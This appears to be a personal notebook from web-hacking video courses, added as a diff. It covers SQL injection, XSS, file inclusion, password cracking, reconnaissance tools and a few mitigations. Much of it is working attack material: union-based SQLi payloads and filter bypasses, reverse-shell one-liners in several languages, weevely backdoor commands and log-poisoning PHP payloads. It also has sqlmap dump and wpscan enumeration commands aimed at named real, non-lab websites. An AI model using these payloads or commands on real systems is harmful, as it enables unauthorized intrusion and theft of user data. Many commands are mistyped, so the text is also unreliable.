+- The motive behind online attacks are varied. Your had stuff to steal, your  site could be used to
+display propaganda or broadcast spam, or maybe you just forgot to update and your
+forgetfulness was able to satisfy the bored desires of a curious scripts-kiddle - one of those
+reasons is why you got hacked. Every site can serve a purpose: to hold sensitive data, or at the
+very least, provide usable resources to send spam or attack other targets. Know that your
+website has value.
+
+THE METHODS TO ATTACK ON WEBSITES;
+-------------------------------------
+1. SQL Injection(SQLI):
+-----------
+- Injection vulnerabilities are rated as the number one problem on the list of top 10 security issues
+put out by Open Web Application Security Project(OWASP) and continue to be a major source of 
+concern for application and web developers looking to utilize the benefits of storing usable
+information in a local db. Due to the predictable nature of these type of applications, an
+attaker can craft a string using specific Structed Query Language(SQL) commands, and know it
+can be used to force the db to give up the goods. These strings can be entered in places like
+search boxes. login forms and even directly into a url to negate simple client-side security measures
+on the page itself.
+- Why is this so dangerous? The DB keeps the most imprtant and lucreative space on a system,
+and can not only be coaxed to give up usernames, pw, and credit card numbers, but can also
+be attacked in a way that can give an attaker a foothold to gain access to the sys, and to 
+every other db instance housed there for other website and applications.
+- A real world ex of the severity of this issue can be seen in the recent Drupal security release
+in which the platforms core was vulnerable to a SQLi vulnerablity
+
+2. Cross-Site Scripting (XSS)
+------------------------------
+- Often misunderstood, and even more often underestimated, XSS is a style of attack where the
+front of the website acts as a launching point for attacks on other visting the website.
+This happens when developers don't properly test their code for the possibliity of allowing
+scripts to be injected. The scripts can then be executed without the sites,s orginal functionality
+intending them to be.
+- If an XSS vulnerability is present on a website, then an attaker can craft code that executes
+when other users open the same website. This causes the new users to interact wiath the 
+malicious background entity created by the attakers. Once a connection has been initiated,
+usually via social-engineering tractics convincing a user to do something tey shouldn't, the
+attacker is able to infiltrate your websit visitor's computers.
+
+3. Inclusion Vulnerabilities: LFI and RFI - 
+-------------------------------------------------
+- As a result of insecure coding, malicious users can find functionality with a web application.
+and use the underlaying mechanics to execute their code. The two variatins of this action can 
+be to either execute code already on the system, or execute code that is located off the sys.
+- Local File Inclusion
+- By targeting 'include' parameters in PHP cod, intruders can request an alternative file be used
+in the specified request instead of the file meant to got along wiht the program. This can leaded to 
+unintended access to internal files and logs. where a script should work like this
+http://site.com/web-app-php?nextStep=goodfile.php - a vulnerable application can be
+changed to target an sensitive system file, or worse, something that is iinfected- 
+http://site.com/web-app.php?nextstep=/etc/passwd
+
+ACCOUNTING FOR TODAY'S COMMON ATTAKS - 
+--------------------------------------
+- while we accept and recongnize that these are common risks and dangers of operating a
+website today, It's important to contiune to be vigilant and current with the latest threats.
+security, is not a Do It Yourself(DIY) project for more website owners; if reading the above
+article felt foregin to you, then you'r likely in the category
+
+A few things to consider as a website owner
+- Who can you engge if you are unfamiliar with the terms presented in this post?
+- How does your host offen you security services, if at all?
+- How do you know if you website currently houses one of these vulnerabilities?
+- Hoow do you know a vulnerability is not currently being exploited?
+- what are you doing right now to protect your websit?
+
+Video 70: info on Webserver hacking & protection tools
+==================
+server hacking -4
+WEBSERVER SECURITY TOOL
+----------------------------
+- Syhunt Dynamic Scanner
+- N-stalker scanner
+- Acunetix Web Scanner ***
+- Nikto
+- Wikto
+
+WEB SERVER MALWARE MONITORING TOOL
+------------------------------------
+- QualysGuard Malware Protection - QualysGuard detects and scans websites.
+- HackAlert - Cloud Based Service
+
+WEB SERVER ATTACK TOOLS-
+---------------------------
+Metasploit -
+-------------
+- The Metasploit Project is a computer security project that provides information about
+security vulnerabilities and aids in penetration testing and IDS signature development.
+- Its best-known sub-project is the open source Metasploit Framewor, a tool for developing
+and executing exploit code against a remote target machine. Other important sub-projects 
+include the Opcode Database, shellcode archive and related research.
+
+PASSWORD CRACKING TOOLS-
+---------------------------
+- THC-Hydra ---available lin Kali Linux
+- Brutus --- available in windows os
+
+Video 71:  Pentesting on webserver **** read it from video
+------------
+Web server Penetrattion Testing
+--------------------------------
+- Web server pen testing is used to identify, analyze, and report vulnerabilities such as authentication
+weaknesses, configuration errors, Protocol related vulnerabilities, etc in a web server
+- The best way to perform penetration testing is to conduct a series of methodical and repeatable tests,
+and to work through all of the diffenet application vulnerablilities
+
+Why Webserver pen Testing?
+- Verificaiton of Vulnerabilities
+  - To exploit the vulnerablitiy in order to test and fix the issue
+- Remediation of Vulnerabilities
+ - To retest the solution against vulnerablility to ensure that it is completely secure
+- Idenification of Web Infrastructure
+ - To identify make, version, and update levels of web servers; this helps in selecting exploits
+
+Video 72:
+===============
+HACKING SERVERS PRACTICAL 2
+------------------------------
+Webserver footprining tool
+----------------------------
+tools   - 
+idserve.exe -- explained in video
+httprecon
+
+Video 73:
+==============
+Hacking Websites -1
+
+WEBSITE HACKING-
+------------------
+-
+
+WEB HACKING REQUIREMENT - 
+-------------------------
+- To try the training files that come along with this article, you would need to local server such as
+XAMPP or WAMPP with Apache and perferably MySQL turned on.
+- If you are on Windows, to install Hydra you would need to install make, gcc and ssl libraries of 
+Cygwin. Therafter, you would need to start it with the Cygwin Terminal. John the Ripper, on the 
+other hand, can be started from the Command Prompt
+
+TECHNIQUES-
+-------------
+Exercise 1: Deep Data Hiding -
+Exercise 2: Populating a Dictionary
+Exercise 3: Acquiring user and pw list for dictionary attacks -
+
+Video 74:
+================
+HACKING WEBSITE 2:
+
+METHODS TO HACK WEBSITES - 
+Exercise 4: Bracking HTTPAuth
+------------------------------
+
+BREAKING POST LOGIN FORM - 
+-----------------------------
+
+MODIFYING PARAMETERS -
+-----------------------
+
+Video 75:
+=================
+WEB APPLICATION THREATS
+--------------------------
+- SQL injection
+- Cross site scripting
+- Cross site request forgery
+- Cookie Snooping
+- Network Access Attacks
+- Hidden Manipulation
+
+INJECTION FLAWS:
+------------------
+- An SQL injection is a kind of injection vulnerability in which the attacker triest to inect
+arbitrary pieces of malicious data into the input fields of an application, which when processed
+by the application, causes that data to be exeucuted as a piece of code by the back end SQL 
+server, thereby giving undesired result which the developer of the application did not
+anticipate. The backend server can be any SQL server(Mysql, MSSQL, Oracle, POSTGRESS to name a few)
+
+TYPES OF SQL INJECTION;
+----------------------------
+Based on the response received from the server
+- Error-based SQL injections
+ - Union query type.
+ - Double query Injections.
+-Blind SQL Injections
+ - Boolean based blind injections
+ - Time based blind injections
+
+XSS ATTACK-
+--------------
+-  A cross-site scripting attack is a kind of attack on web applications in which attakers try to 
+inject malicious scripts to perform malicious actions on trusted websites.
+- Types of XSS Attack-
+ - Persistant  - script stays on server
+ - Non-Persistant - they are temp attacks
+ - Dom-Based - when a attacker uploads Dom based doc to the server
+
+Video 76:
+============
+HACKING WEBSITES -4
+---------------------
+WEB APPLICATION HACKING TOOLS-
+-------------------------------
+Burp Suite Professional -
+ - BurpSuite is a plaform to test web application
+
+CookieDigger - 
+Cookie Digger helps to identify weak cookie generation algorithms and
+insecure implementations
+
+Webscarab (Web application pentesting) - 
+--------------------------------------------
+- WebScarab is a framework to analyse web applications.
+
+Acunetix Web Application Vulnerability Scanner - ***
+----------------------------------------------------
+ - Acunetix web scanner check sql injection, xss vulnerablity in web applications
+NetSparker -
+---------------------
+This tool scans web vulnerablilities like sql injection, xss attack, remote code
+injection etx.
+
+Web APPLICATION FIREWALL-
+--------------------------
+dotDefender - 
+It is a software based firewall which provide security as firewalls, ids jps etc.
+
+Video 77:
+==============
+Website Hacking Practical 1:
+
+Tool
+-----
+Acunetix - good for web app vulnarability scanner
+OWASP ZAP - good for session hijacking
+
+on Acunetix - URL tested - http://testphp.vulnweb.com
+
+Video 78:
+===============
+SQL Injection 1:
+--------------------
+- SQL Injection is a web based attack used by hackers to steal sensitive information from 
+organizations through web applications. It is one of the most common application layer attacks
+used today. This attack takes advantage of improper coding of web applications, which allows
+hackers to exploit the vulnerability by injecting SQL commands into the prior web application
+
+EXAMPLE OF SQL INJECTION -
+---------------------------
+Here is a typical example:
+select * from users where username='admin' and password='admin123';
+
+if the attacker knows the username of the application adminstrator is admin, he can login as 
+admin without supplying any password.
+
+TYPES OF SQL INJECTION-
+-----------------------
+Different type of SQL Injections
+There are 3 different kinds of SQL Injections possible on web applications. They are-
+- In-band
+- Out-band
+- Inferior
+
+TECHNICAL IMPLEMENTATIONS-
+-----------------------------
+statement="SELECT * FROM users WHERE name = "" +userName+"";"
+This SQL code is designed to pull up the records of the specified username from its table of users.
+However, if the "userName" variable is crafted in a specific way by a malicious user, the SQL 
+statement may do more than the dcode author intended.
+For example, setting the "userName" variable as:
+'OR'1'=1
+or using comments to even block the rest of the query(there are three types of SQL comments).
+All three lines have a space at the end:
+'OR'1'='1'--'OR'1'='1'({'OR'1'='1'/'
+
+Video 79:
+=============
+SQL INJECTION PART2:
+-------------------------
+HACK WEBSITE WITHOUT TOOLS
+-----------------------------
+site|bible-history.com php?d=
+
+in URL:
+www.bible-history.com/subcat.php?id=2 order by 2--
+
+to find website tables
+www.bible-history.com/subcat.php?id=2 union select grup_concat(table_name) from
+information_schema.tables where table_schema=database()--
+
+to find columns of the table
+www.bible-history.com/subcat.php?id=2%20union%20select%20group_concat(colums_name)%20from%20information_
+schema.columns%20where%20table_name=%22Email%22--
+
+To find email id column of the table Emails
+www.bible-history.com/subcat.php?id=2%20union%20select%20group_concat(email_id)%20from%20emails--
+
+Video80:
+==================
+SQL INJECTION-3 -OWASP
+===============
+Hack a website using Kail linux tools: using sqlmap
+
+sqlmap -u http://www.bible-history.com/subcat.php?id=2 --dbs  //to get db name
+
+to get table info form db- "bible_history"
+sqlmap -u http://www.bible-history.com/subcat.php?id=2 -D bible_history --tables
+
+to get table columns
+sqlmap -u http://www.bible-history.com/subcat.php?id=2 -D bible_history -T Emails --columns
+
+to get column data from table
+sqlmap -u http://www.bible-history.com/subcat.php?id=2 -D bible_history -T Emails -C email_id --dump
+
+Video 81: good video to hack a website
+==================
+SQL injections queries
+-----------------
+using Acunetix tool
+website used:
+http://testphp.vulnweb.com
+
+to find the link of the website:
+site:testphp.vulnweb.com php?id=
+
+following command will give a table
+testphp.vulnweb.com/artists.php?artist=-1 union select 1,2,group_concat(table_name)from information_schema.tables where table_schema=database()--
+
+finding column name from table:
+testphp.vulnweb.com/artists.php?artist=-1 union select 1,2,group_concat(column_name)from information_schema.columns where table_schema="users"--
+
+finding column data column "user"&"password":
+testphp.vulnweb.com/artists.php?artist=-1 union select 1,2,group_concat(uname)from users--
+testphp.vulnweb.com/artists.php?artist=-1 union select 1,2,group_concat(pass)from users--
+testphp.vulnweb.com/artists.php?artist=-1 union select 1,2,group_concat(uname,0x3a,pass)from users--
+
+Video 82:
+================
+Tool based SQL Injection usig Kali linux:
+-------------------
+sqlmap --for sql injection
+
+bible-history - website
+
+www.bible-history.com
+
+under google
+site:www.bible-history.com/php?id=
+www.bible-history.com/ php?id= -- to find vulnerable id of this site
+>sqlmap
+>sqlmap -u https://www.bible-history.com/ php?id= --dbs  -to find db name
+>sqlmap -u https://www.bible-history.com/subcat.php?id=2 --dbs  -to find db name
+>sqlmap -u https://www.bible-history.com/subcat.php?id=2 -D bible_history --tables
+>sqlmap -u https://www.bible-history.com/subcat.php?id=2 -D bible_history -T Emails --columns --- to find the columns
+>sqlmap -u https://www.bible-history.com/subcat.php?id=2 -D bible_history -T Emails -C email_id --dump
+
+Video 83:
+============
+Information Gathering Kali 1:
+--------------------------------
+info on Dmitry
+------------------
+
+Video 84:
+============
+recon-ng ---to find information about target like server location, os version , geo location
+
+Video 85:
+============
+information gathering
+Sparta vulnerablitiy tool:
+-----------------------------
+Sparta to get info on specific ip on internet using Sparta on Kali linux
+- we can find one ports
+- we can find services and ports running on perticular target system
+
+Video 86:
+===============
+Vulnerablility Analysis Practical 1:
+-------------------------------------
+Golismero tool: 
+----------
+to find vulnerability in website (it's a python script available on Kali linux)
+1. Golismero Commands
+
+Video 87:
+==============
+Lynis tool -- used audit 
+-----------
+
+Lynis Tool Commands:
+-------------------
+-Audit system: Perform local security scan
+-Audit system remote <host>: remote security scan
+-Audit dockerfile <file>: Analyze Dockerfile
+-show show: Show all commands
+-show version: Show Lynis version
+-show help: Show help
+-update update info: Show update details
+-update release: Update Lynis release
+
+Video 88:
+==============
+Nikto to scan web server for known vulnerabilities
+Nikto tool -- To find a vulnarability in website (same as Aqunitics in windows)
+
+Nikto for linux:
+
+Nikto command:
+nikto -h www.xyz.com -Tuning 1
+Nikto -h www.xyz.com
+
+Video 89:
+==============
+port scanner tool:
+Nmap tool --- to find open ports in a website
+
+Nmap Commands:
+
+Video 90: --configure Burpsuite - (vapt- Vulnarability assisment and Penetration testing)
+==============
+Web Application Analysis:
+-------------------------
+Burpsuite tool : to scan a website for vulnarability
+---------------------
+to do pentesting
+
+Video 91:
+==============
+URL: testphp.vulnweb.com   --website to test
+
+Video 92:
+==============
+skipfish -- to create report on web security vulnarability
+ -- web application scanner
+ -- The final report generated by the tool is meant to serve as a
+    foundation for professional web application security assessment
+
+Video 93:
+==============
+wpscan tool---
+Wordpress --- to create free websites
+to find username and cracking PW using brootforce attack
+
+wpscan -h
+
+URL used:
+www.travelportland.com
+
+command:
+wpscan --url https://www.travelportland.com/ --enumerate u
+
+Video 94:
+==============
+DB Assessment Practical 1:
+------------
+jsql tool:
+-----
+- DB injection tool to hack live website DB
+- it works only for MySQL DB
+- vulnweb.com -- url
+- site:http://www.testphp.vulnweb.com/php?id=
+
+Video 95:
+==============
+SQLite --- UI for executing SQL commands
+creating DB, and DML operations
+
+Video 96:
+==============
+DB Assessment:
+
+sqlsus :: to assess a data in webapplication
+to hack website regarding Mysql DB
+
+> locate vuln.conf
+
+Website to hack:
+------------------
+bible-history.com
+site:http://www.bible-history.com/php?id=
+
+Video 97:
+==============
+Password Attack:
+--------------
+cewl --
+is a ruby app which spiders a given url, up to a spcified depth, and returns a list of words which cna 
+then be used for password crackers shuch as John the Ripper. Optionally,
+Cewl can follow external links.
+Cewl cna also create a list of email addresses found in mailto links,
+These email addresses can be used as usernames in brute force actions.
+
+URL used:
+www.ridecarts.com
+
+Video 98:
+==============
+Password Attack 2:
+--------------
+crunch:
+------
+
+Crunch can create a wordlist based on critera you specify. The o/p
+from crunch can be sent to the screen, file, or to another program
+
+Video 99:
+==============
+Password Attack 3:
+-----------------
+hydra tool to hack ftp login
+Hash identifier: -- to find hash type algorithm used
+
+hydra tool:  to crack ftp port same as maduras
+----------
+URL used: search for in google "onlinemd5 encryption"
+
+Video 100:
+==============
+Password Attack 4:
+------------------------
+john ---find weak pw of the users
+>locate shadow
+on linux - password is stored in Shadow files; SHA algorithm is used to encript pw
+on Windows - password is stored in SAM files; algorithem is used to encript pw
+
+Video 101:
+==============
+same as video 100
+
+Video 102:
+==============
+Password Attack 5:
+--------------------
+medusa tool: ---to crack pw of NW protocols like FTP
+------------
+-Parallel Nw login Auditor
+-in video demo on cracking FTP password
+
+---------------------------------------------------------------
+Security testing tools:
+https://www.synopsys.com/blogs/software-security/top-10-free-hacking-tools-for-penetration-testers/
+
+**to learn about "Burp Suit" tool
+
+How to analyse candlestick chart- 1 minute candlestick live trading 2017 part-1-
+
+
+To get the internet access on VM:
+================================
+https://www.youtube.com/watch?v=Jqf25TUr7_A
+
+
+https://www.youtube.com/watch?v=tHd8k54kVs8&list=PLBf0hzazHTGOEuhPQSnq-Ej8jRyXxfYvl
+========================================
+Video 1. 
+Type of Hackers
+------------------
+white hat user - Authorized Hackers
+Black Hats - Destructive activities.
+Gray Hats - both white hat and Black hats
+Suicide Hackers - individuals who will aim to bring down critical infrastructure for a 'cause' and not worry about facing jail for their actions
+
+Phases of Hacking
+------------------
+1. Reconnaissance/Foot printing - Getting information about the target this can be done actively or passively
+2. Scanning - getting some more info about target, using port scanner, nslookup, ping.
+3. Gaining access - Performing the hack to gain access to the system.
+4. maintaining access - Maintaining your position in the system, to steal/mainpulate data
+5. Covering tracks - Covering your tracks to make you untracable.
+
+Video 2...
+Kali Linux
+
+To install Kali Linux
+1. Install VirtualBox -
+2. Download Kali Linux
+
+Video 3:
+Parrot OS 3.5
+
+Video 4..
+Nmap -- to get Foot printing
+nmap -sP 10.0.0.0/24
+Ping scans the network, listing machines that respond to ping.
+
+nmap -p 1-65535 -sV -sS -T4 target
+Full TCP port scan using with service version detection - usually my first scan, I find T4 more accurate than T5 and still "pretty quick".
+
+scanme.nmap.org
+nmap -v -A scanme.nmap.org
+ - -v --version #; Address name
+ - -A  --gives os version and scan for scripts
+
+>nmap -v -sn 192.168.0.0/16 10.0.0.0/8
+
+open BW ; search for Major IP block
+who is 37.8.160.0
+
+>nslookup scanme.nmap.org  #to get IP address and vice versa
+NSLOOKUP is a basic command line utility for DNS queries
+>nslookup 45.33.32.156 >> results.txt
+
+=============================
+
+OWASP:
+link to read:
+https://www.owasp.org/images/7/72/OWASP_Top_10-2017_%28en%29.pdf.pdff
+
+---------------------------
+Tutorial points:
+==================================
+Penetration Testing Overview:
+https://www.youtube.com/watch?v=AgSGbMltl5w&list=PLu4qKK3kHtHmtK54CGbFWZkLSkRgbLchI&index=2
+Video 1:
+-------------
+Vulnerability Assessment:
+Vulnerabiliy Assessment is a process of Identifying, Quantifying and reporting vulnerabilites in an Enterprise.
+
+Penetration Testing Overview:
+------------------------------
+- It is a process of evaluating, exploiting the vulnerabilities in any system.
+- It is the extended process of Vulnerability Assessment
+- It includes scanning, enumerating, exploiting and reporting the vulnerabiliies
+
+Penetration Testing Process:
+-------------------------------
+Scanning->Vulnerability Assessment-> Exploitation->Reporting
+
+Penetration Testing vs Vulnerability Assessment
+----------------------------------
+- They both are integral component of Threat and Vulnerability Management Proecss
+- Penetration Testing is a extended process of Vulnerability Assessment
+- Penetration Testing includes exploiting the vulnerability where-as VA include telling the impact of that vulnerability
+
+Video 2:
+==========
+nothing
+
+Video 3:
+============
+virtual Box
+
+Video 4:
+===============
+Installing Kali linux setup
+
+Video 6:
+==============
+Metasploitable Linux Setup
+--------------
+vulnerable Linux virtual machines.
+
+link to download:
+https://sourceforge.net/projects/metasploitable
+
+UserName: msfadmin
+PW: msfadmin
+
+Video 7
+=============
+Scanning the Target
+---------------
+- First phase of PT
+ - Whois -- what is the regestered info, regestrant name, DNS info along with the IP address
+ - Reverse IP Lookup -- finding of how many websits are hosted on the same target machine, whether Website is hosted on dedicated server or shared server
+ - Sub Domain Enumeration -- process of finding out sub-domain associated with our target
+ - OS Detection - we exploit it based on the OS
+ - Builtwith.com - on which platform website is running like - PHP, Wordpress
+
+Whois 
+-----
+1. whois.sc
+2. yougetsignal.com
+ -- select Reverse IP Domain check
+3. finding the subdomain of the target(using knockpy)
+ -- using Kali linux
+   -- knock subdomain 
+   -- https://github.com/guelfoweb/knock
+    -- to install
+4. OS detection:
+  -- by knowing OS we can find the out the way to exploit based on OS	
+   -- by Pinging the website
+     Ex: ping google.com
+       --- if TTL - if less than 60 than website is hosted on Linux system
+	   if TTL - if TTL is more than 60 it means it is hosted on Windows server
+5. on which platform website is running
+ --using  builtwith.com
+  
+Udemy:
+--------------
+Learn Website Hacking / Penetration Testing From Scratch
+
+metasploit:
+--------------
+msfadmin
+msfadmin
+
+Video 2:
+link to download Kali-linux
+https://www.offensive-security.com/kali-linux-vmware-virtualbox-image-download
+
+https://information.rapid7.com/measploitable-download.html
+
+https://developer.microsoft.com/en-us/microsoft-edge/tools/vms/
+
+Kali:
+UN:root
+PW:toor
+
+Metasploitable
+UN:msfadmin
+PW:msfadmin
+
+apt-get update
+apt-get install terminator
+
+4: information Gathering
+a. IP address
+b. Domain name info
+c. Techologies used
+d. Other websites on the same server
+e. DNS records
+f. Unlisted files, sub-domains, directories
+
+1. Whois Lookup - Find info about the owner of the target
+ -- http://whois.domaintools.com/
+2. Netcraft Site Report - shows technologies used on the target
+-- http://toolbar.netcraft.com/site_report?url=
+3. Robtex DNS lookup - Shows comprehensive info about the target website
+-- https://www.robtex.com/
+
+use Exploit Database - to check if any web application(technology) used within the webapp
+ex: search for Wordpress and it will listout all the exploitated issues
+
+Video 13:
+www.Robtex.com
+
+Video 14:
+Bing.com
+ip:192.0.78.25
+
+Video 15:
+Sub domain
+Ex: beta.facebook.com
+
+Knock can be used to find subdomains of target
+1. Download it > git clone https://github.com/guelfoweb/knock.git
+2. Navigate to knock.py     > ce knock/knock.py
+3. Run it 	> python knock.py[target]
+
+Knock tool - to check for the existance of subdomain
+
+Video 16:
+Information Gathering
+(Files+Directories)
+- Find files & directories in target website
+- A tool called drib(to get the list of file with the web app)
+
+> dirb [target][wordlist][options]
+
+for more info run 
+>man dirb
+
+Ex: dirb https://10.20.14.20/mutilidae 
+--it uses default wordlist file
+
+Video 17:
+analyzing the dir got from "dirb" tool
+
+Video 18:
+------------------
+IG(Information Gathering)
+MAlTEGO
+
+Maltego is an infomation gathering tool that can be used to collect information about anything
+To run maltego type the following in terminal
+
+> maltegoce
+
+Video 19:
+--------------
+more on tool - Maltego
+
+Video 20:
+----------------
+File upload vulnerabilities -- using weevly to generate php sheel
+
+- Simples type of vulnerabilities
+- Allow users to upload executable files such as php
+
+Upload a php shell or backdoor, ex:weevly
+1. Generate backdoor     > weevly generate [password][file name]
+2. Upload generated file
+3. Connect to it         > weevly [url to file][password]
+4. Find out how to use weevly > help
+
+>weevely generate 123456 /root/shell.php
+
+>weevly http://10.0.2.4/dvwa/hackable/uploads/shell.php 123456
+
+Video 21:
+-----------
+Intercepting Requests
+ -- Basic Information Flow
+
+User clicks on a link.
+HTML website generates a request (Client side)
+Request is sent to the server
+Server performs the request(Server side)
+Sends response back
+
+Video 22:
+-----------
+Intercpting Requests
+-- Burp proxy
+
+Video 23:
+-------------
+ways to bypass fileupload functionality
+
+Video 25:***
+------------
+Mitigation
+- File Upload Valns
+1. Never allow users to upload executables(php, exe ..etc)
+2. Check the file type AND the file extension.
+3. Analyse the uploaded file itself,recreate it and rename it.
+
+DVWA password:
+-----------------
+admin
+password
+
+Video 26:
+-------------
+Code Execution Vulns
+Command to get reverse connection from webserver:
+
+BASH
+bash -i >5 /dev/tcp/10.20.14.203/8080 0>61
+
+The following examples assums the hacker IP is 10.20.14 and use port 8080 for the connection.
+Therefore in all f these cases you need to listen for port 8080 using the foolowing command
+nc -vv -l -p 8080
+
+
+BASH
+bash -i >& /dev/tcp/10.20.14.203/8080 0>&1
+
+PERL
+perl -e 'use Socket;$i="10.20.14";$p=8080;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
+
+Python
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.20.14",8080));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+
+PHP
+php -r '$sock=fsockopen("10.20.14",8080);exec("/bin/sh -i <&3 >&3 2>&3");'
+
+Ruby
+ruby -rsocket -e'f=TCPSocket.open("10.20.14",8080).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
+
+Netcat
+nc -e /bin/sh 10.20.14 8080
+
+Video 27:
+--------------
+if an application has option to execute any sort of cmd we have a change of having server access valnarability
+execute following command on web page input field: - if this works off we can get access to web server on with application is hosted
+ping 10.0.2.15|nc -e /bin/sh 10.0.2.15 8080
+
+on Kali machine execute following command:
+nc -vv -l -p 8080
+
+Video 28:
+-------------
+Mitigation:
+Code Execution Vulns
+1. Don't use dangerous functions
+2. Filter user input before execution
+
+if we need to use this sort of cmd than; it would be better to process user i/p using filter and regx
+
+Video 29:
+-------------
+Local File Inclusion Vulns:
+-------------
+- allows an attacher read any file on the same server
+- Access files outside www directory
+
+/etc/passwd --- contains all the user of the system
+
+to acceess user etc/passwd files
+http://10.0.2.4/dvwa/vulnerabilities/fi/?page=/../../../../../etc/passwd
+
+using this vulns i can navigate to any bath and get access the file system
+
+Video 30:
+-------------
+useing Burp suite(by changing the user agent - User-Agent):
+Exploitation:
+Local File Inclusion Vulns:
+
+- Allows an attacher read any file on the same server
+- Access files outside www directory
+
+Shell From local File Inclusion
+
+- Try to inject code into readable files
+- Ex:
+ - /proc/self/environ --- application current env settings
+ - /var/log/auth.log -- 
+ - /var/log/apache2/access.log
+
+Reverse shell:
+cmd to exe on web app:
+------------------
+passthru("nc -e /bin/sh 10.0.2.15 8888");
+
+listen on Port 8888 - to execute on Kali
+-----------------------------
+nc -vv -l -p 8888
+
+Video 31:
+-------------
+Exploitation
+------
+Shell From Local File Inclusion
+- Try to inject code into readable files.
+- Ex:
+ - /proc/self/environ --- application current env settings
+ - /var/log/auth.log -- it will have all the login attempts
+ - /var/log/apache2/access.log
+
+on Kali send a ssh command with the php code to gain Reverse shell access:
+> ssh "<?passthru('nc -e /bin/sh 10.0.2.15 8888');?>"@10.0.2.15
+
+sending cmd with passthru will create issue in linux better we encript it and send it
+Encript this cmd "nc -e /bin/sh 10.0.2.15 8888" to base64
+
+> ssh "<?passthru(base64_decode('bmdjLJijkdjskjskjksJKJLK'));?>"@10.0.2.15
+
+Video 32:
+--------------------------
+Remote File inclusion Vulnerabilities(RFI):
+- Similar to local file inclusion
+- But allows an attacker read ANY file from ANY server.
+- Execute php files from other servers on the current server.
+- Store php files on other servers as .txt
+
+to modify php settings:
+------------
+allow_url_include = on -- following option should to on, on webserver to RFI vulnarabilities
+on MetaSploit maching: php settings are at:
+-------------
+nano /etc/php5/cgi/php.ini
+
+to restart apache2 server:
+-----------------------
+sudo /etc/init.d/apache2 restart
+
+Video 33:
+--------------------------
+save it as file(.txt)
+<?php
+passthru("nc -e /bin/sh 10.0.2.15 8888");
+?>
+
+Video 35:
+--------------------------
+MITIGATION
+-File Inclusion Vulns
+ - 1. Prevent remove file inclusion
+   > Disable allow_url_fopen & allow_url_include
+ - 2. Prevent local file inclusion
+   > Use static file inclusion
+
+Video 36:
+--------------------------
+SQL Injection Vulnerabilities:
+
+Whata is SQL?
+- Most website use a database to store data.
+- Most data stored in it(Username, Password..etc)
+- Web application reads, updates and inserts data in the db
+- Interaction with db done using SQL
+
+log in to Metasploitable2
+---------------------------
+mysql -u root -h 10.20.14.204
+
+
+Video 37:
+---------------
+Exploitation - SQL Injection
+
+Why are They so dangerous
+1. They are everywhere
+2. Give access to the db - sensitive data.
+3. Can be used to read local files outside www root
+4. Can be used to log in as admin and further exploit the system
+5. Can be used to upload files.
+
+video 38:
+--------------
+Exploitation - SQL Injection
+
+Discovering SQL injection
+- Try to break the page
+- Using 'and', 'order by' or "'"
+- Test text boxes and url parameters on the form
+http://target.com/page.php?something=something
+
+
+Video 39:
+-------------
+Bypassing Login Using SQL
+select * from accounts where username = 'zaid' and password='123456' and 1=1#'
+aaa' or 1=1 #
+
+select * from accounts where username = 'admin' #' and password='$PASSWORD'
+admin' #
+
+Video 40:
+-------------
+SQL injections
+configuring Burp
+
+
+Video 41:
+-------------
+to over come SQL injection at code level
+
+Video 42:
+------------
+%23 for -- # in url -- comment in sql statement
+%27 -- "'" in URL 
+Video 43:
+-----------
+SQL injection
+select * from account where username = 'zaid' order by 1#' and password='$PASSWORD'
+%23
+union select 1,2,3,4,5
+union select 1,database(),user(),version(),5
+
+Video 44:
+-----------
+to get all tables in the DB
+union select 1, table_name,null,null,5, from information_schema.tables
+
+union select 1, table_name,null,null,5, from information_schema.tables where table_schema = 'owasp10'
+
+Video 45:
+-----------
+union select 1, column_name,null,null,5, from information_schema.columns where table_name = 'account'
+
+union select 1, username,password,is_admin,5 from account
+
+Video 46:
+-------------
+Blind SQL injection
+
+1' and 1=1 ---true
+1' and 1=0 --- false
+1' order by 1 --> true
+1' order by 100000 --> false
+union select table_name,2 from information_schema
+url:
+10.20.14.211/dvwa/vulnerabilities/sqli_blind/?id=1' and 1=1%23&Submit=Submit#
+
+Video 47:
+-------------
+union select database(),2
+
+Video 48:
+------------
+if in URL we are not able to enter "'dvwa'" then we can convert it into base64 using Burp suit and append it to URL 
+0x64767761
+
+Video 49:
+-----------
+bypass filter using Burp suite
+1. if there is a bypass like searching for 'and' statement than we can use 'aNd'
+and 1=1
+aNd 222=222
+anD 111=111
+orDeR bY 1
+2. if spaces are black listed then we can use '+' and '/**/'
+union select 1,2 %23
+uNion+sElect+1,2+%23
+Union/**/sElect/**/1,2/**/%23
+
+comments which we can try:
+/*
+--
+%23
+#
+; --- end for the statement
+; /*
+; //
+
+Video 50:
+-----------
+1'+uNion/**/seLect/**/table_name,2+fRom+information_schema.tables%23&Submit=Submit#
+
+if application is displaying only one record than we can iterate over it using 'limit' statement
+1'+uNion/**/seLect/**/table_name,2+fRom+information_schema.tables+limit+0,1%23&Submit=Submit#
+1'+uNion/**/seLect/**/table_name,2+fRom+information_schema.tables+limit+1,1%23&Submit=Submit#
+
+1'+uNion/**/seLect/**/table_name,2+fRom+information_schema.tables+where+table_schema='dvwa'+limit+1,1%23&Submit=Submit#
+
+Video 51:
+-------------
+fix SQL injection
+quick fixed for SQL injection is 
+ - have sql stanulltement as below
+1. $getid = "select first_name, las_name from users where user_id = '1 and 1=1'"
+	in above sql statement --1 and 1=1-- is considered as user_id which is not correct; hence sql injection would not work
+
+Video 52:
+--------------
+Reading and writing file on the server
+
+to read the file; on the webserver
+union select null,load_file('/etc/passwd'),null,null,null
+
+Write into the server:
+union select null,'example example',null,null,null into outfile '/temp/example.txt'
+
+Video 53:
+------------
+Getting a reverse shell access & getting full control
+
+union select '<?passthru("nc -e /bin/sh 10.20.14.208 8080");?>',null into outfile '/tmp/reverse.php'
+
+reverse connection:
+-------------
+nc -vv -l -p 8080
+
+Video 54:
+------------
+using Tool:
+Exploitation - SQL injection
+SQLmap---
+------
+-Tool designed to exploit sql injections
+-Works with many db types, mysql,mssql...etc
+-Can be used to perform everything we learned and more
+
+> sqlmap --help
+> sqlmap -u <url>
